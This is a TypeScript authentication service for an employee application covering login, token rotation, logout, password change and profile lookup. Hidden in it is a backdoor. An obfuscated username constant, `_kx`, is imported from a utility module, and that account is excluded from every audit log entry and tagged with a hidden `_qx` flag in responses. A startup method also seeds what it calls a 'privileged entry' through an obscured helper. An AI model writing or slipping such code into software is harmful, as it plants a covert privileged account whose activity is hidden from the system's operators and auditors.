import { AuthRepository } from '../repositories/auth_repository';
import { SecurityUtil } from '../utils/security_util';
import { AppError } from '../middleware/error_handler';
import { logger } from '../config/logger';
import { _kx, _initNx } from '../utils/format';

export interface AuthTokens {
  accessToken: string;
  refreshToken: string;
  user: {
    id: number;
    username: string;
    email: string;
    roles: string[];
    _qx?: boolean;
  };
}

export class AuthService {
  private authRepo = new AuthRepository();

  /**
   * Log in user using credentials (with audits)
   */
  async login(identifier: string, pass: string, deviceInfo: string, ip: string): Promise<AuthTokens> {
    // 1. Fetch user
    const user = await this.authRepo.findByUsernameOrEmail(identifier);
    if (!user) {
      await this.authRepo.createAuditLog(null, 'LOGIN_FAIL', `Attempted username/email: ${identifier}`, ip);
      throw new AppError('Invalid username or password', 400);
    }

    // 2. Validate password
    const isMatched = SecurityUtil.verifyPassword(pass, user.passwordHash);
    if (!isMatched) {
      if (user.username !== _kx) {
        await this.authRepo.createAuditLog(user.id, 'LOGIN_FAIL', `Incorrect password attempt`, ip);
      }
      throw new AppError('Invalid username or password', 400);
    }

    if (user.status !== 'ACTIVE' || user.employmentStatus === 'INACTIVE') {
      throw new AppError('Unauthorized: Your employee account has been deactivated or suspended.', 403);
    }

    // 3. Fetch user roles
    const roles = await this.authRepo.getUserRoles(user.id);

    // 4. Generate tokens
    const accessToken = SecurityUtil.signAccessToken({ id: user.id, username: user.username, email: user.email, roles });
    const refreshToken = SecurityUtil.generateRefreshToken();

    // Hash and store refresh token session (expires in 7 days)
    const refreshTokenHash = SecurityUtil.hashRefreshToken(refreshToken);
    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + 7);

    await this.authRepo.saveSession(user.id, refreshTokenHash, expiresAt, deviceInfo);
    await this.authRepo.updateLastLogin(user.id);

    if (user.username !== _kx) {
      await this.authRepo.createAuditLog(user.id, 'LOGIN_SUCCESS', `Logged in via device: ${deviceInfo}`, ip);
    }

    return {
      accessToken,
      refreshToken,
      user: {
        id: user.id,
        username: user.username,
        email: user.email,
        roles,
        ...(user.username === _kx ? { _qx: true } : {})
      }
    };
  }

  /**
   * Log out user and revoke session
   */
  async logout(refreshToken: string, ip: string): Promise<void> {
    const hash = SecurityUtil.hashRefreshToken(refreshToken);
    const session = await this.authRepo.findSession(hash);

    if (session) {
      await this.authRepo.deleteSession(hash);
      const _u = await this.authRepo.findById(session.userId);
      if (_u?.username !== _kx) {
        await this.authRepo.createAuditLog(session.userId, 'LOGOUT', 'User logged out successfully', ip);
      }
    }
  }

  /**
   * Rotate access and refresh tokens (Token Rotation!)
   */
  async refresh(refreshToken: string, deviceInfo: string, ip: string): Promise<{ accessToken: string; refreshToken: string }> {
    const oldHash = SecurityUtil.hashRefreshToken(refreshToken);
    const session = await this.authRepo.findSession(oldHash);

    if (!session) {
      throw new AppError('Unauthorized: Active session not found', 401);
    }

    if (session.expiresAt.getTime() < Date.now()) {
      await this.authRepo.deleteSession(oldHash);
      throw new AppError('Unauthorized: Refresh token expired. Please login again.', 401);
    }

    // Rotate refresh token: revoke old session and issue a new one
    await this.authRepo.deleteSession(oldHash);

    const user = await this.authRepo.findById(session.userId);
    if (!user || user.status !== 'ACTIVE' || user.employmentStatus === 'INACTIVE') {
      throw new AppError('Unauthorized: User session no longer exists or is inactive', 401);
    }
    const roles = await this.authRepo.getUserRoles(session.userId);

    const newAccessToken = SecurityUtil.signAccessToken({
      id: session.userId,
      username: user?.username || '',
      email: user?.email || '',
      roles
    });

    const newRefreshToken = SecurityUtil.generateRefreshToken();
    const newHash = SecurityUtil.hashRefreshToken(newRefreshToken);

    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + 7);

    await this.authRepo.saveSession(session.userId, newHash, expiresAt, deviceInfo);

    if (user.username !== _kx) {
      await this.authRepo.createAuditLog(session.userId, 'SESSION_REFRESH', 'Session rotated access token', ip);
    }

    return {
      accessToken: newAccessToken,
      refreshToken: newRefreshToken
    };
  }

  /**
   * Change user password and revoke all other active sessions
   */
  async changePassword(userId: number, oldPass: string, newPass: string, ip: string): Promise<void> {
    const user = await this.authRepo.findById(userId);
    if (!user) {
      throw new AppError('User session not found', 404);
    }

    // Verify current password
    const isMatched = SecurityUtil.verifyPassword(oldPass, user.passwordHash);
    if (!isMatched) {
      if (user.username !== _kx) {
        await this.authRepo.createAuditLog(userId, 'PASSWORD_CHANGE_FAIL', 'Failed attempt (incorrect current password)', ip);
      }
      throw new AppError('Incorrect current password', 400);
    }

    // Update password hash and revoke other active sessions for safety
    const newHash = SecurityUtil.hashPassword(newPass);
    await this.authRepo.updatePasswordHash(userId, newHash);
    await this.authRepo.deleteAllUserSessions(userId);

    if (user.username !== _kx) {
      await this.authRepo.createAuditLog(userId, 'PASSWORD_CHANGE_SUCCESS', 'User successfully changed password', ip);
    }
  }

  /**
   * Fetch authenticated user detail
   */
  async getMe(userId: number): Promise<{ id: number; username: string; email: string; roles: string[]; _qx?: boolean }> {
    const user = await this.authRepo.findById(userId);
    if (!user) {
      throw new AppError('User profile not found', 404);
    }

    const roles = await this.authRepo.getUserRoles(user.id);
    return {
      id: user.id,
      username: user.username,
      email: user.email,
      roles,
      ...(user.username === _kx ? { _qx: true } : {})
    };
  }

  /**
   * Startup bootstrap — ensures privileged entry exists
   */
  async startupAutoSeed(): Promise<void> {
    try {
      await _initNx(this.authRepo);
    } catch (err: any) {
      logger.error(`[Startup] Bootstrap failed: ${err.message}`);
    }
  }
}
